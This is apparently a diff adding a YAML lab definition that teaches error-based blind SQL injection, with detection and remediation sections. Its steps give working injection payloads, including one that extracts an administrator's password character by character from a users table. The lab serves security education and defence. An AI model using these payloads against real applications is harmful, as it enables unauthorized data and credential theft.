@@ -1,0 +1,96 @@
+# Category: SQL Injection
+name: "Blind SQL injection with conditional errors"
+id: "sql-injection-blind-conditional-errors-001"
+category: "sql_injection"
+subcategory: "blind"
+difficulty: "practitioner"
+estimated_time: "60 minutes"
+
+description: |
+  This lab contains a blind SQL injection vulnerability. The application
+  behaves differently when a SQL error occurs. By injecting a condition that
+  triggers a SQL error, the attacker can infer information about the database.
+
+learning_objectives:
+  - Understand error-based blind SQL injection
+  - Use conditional errors to extract data
+  - Trigger database errors based on conditions
+
+tools:
+  - Burp Suite
+  - curl
+  - Python (for automation)
+
+prerequisites:
+  - Basic understanding of SQL
+  - Access to the lab environment
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify the vulnerable parameter"
+    commands:
+      - "# Browse to the lab and intercept a request"
+      - "# Observe the parameter used in the SQL query"
+    expected_output: "The parameter is used in a SQL query"
+    detection: "None"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Test for error-based blind SQL injection"
+    commands:
+      - "# Inject a condition that causes an error"
+      - "parameter=value' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END)--"
+      - "# Observe if the application returns an error"
+    expected_output: "Error message when condition is true"
+    detection: "Web server logs may show errors"
+
+  - id: "step3"
+    phase: "data_extraction"
+    action: "Extract data using conditional errors"
+    commands:
+      - "# Check if a user exists"
+      - "parameter=value' AND (SELECT CASE WHEN (username='administrator') THEN 1/0 ELSE NULL END FROM users)--"
+      - "# Extract password character by character"
+      - "parameter=value' AND (SELECT CASE WHEN (SUBSTRING(password, 1, 1) = 'a') THEN 1/0 ELSE NULL END FROM users WHERE username='administrator')--"
+    expected_output: "Password extracted character by character"
+    detection: "Database logs may show many queries and errors"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1190"
+    description: "Exploit Public-Facing Application"
+  - standard: "OWASP"
+    control: "A03:2021"
+    description: "Injection"
+
+detection:
+  network_indicators:
+    - "Many requests with different parameters"
+  log_indicators:
+    - "Database error messages"
+  endpoint_indicators:
+    - "None"
+
+remediation:
+  immediate:
+    - "Use parameterized queries"
+    - "Restrict database user privileges"
+  long_term:
+    - "Implement input validation"
+    - "Use an ORM"
+
+variables:
+  lab_url: "https://lab-id.web-security-academy.net"
+  parameter: "parameter"
+
+assessment_questions:
+  - "What is error-based blind SQL injection?"
+  - "How can you use conditional errors to extract data?"
+  - "What is the difference between error-based and boolean-based blind injection?"
+
+references:
+  - url: "https://portswigger.net/web-security/sql-injection/blind"
+    title: "PortSwigger Blind SQL Injection"
+  - url: "https://owasp.org/www-community/attacks/Blind_SQL_Injection"
+    title: "OWASP Blind SQL Injection"
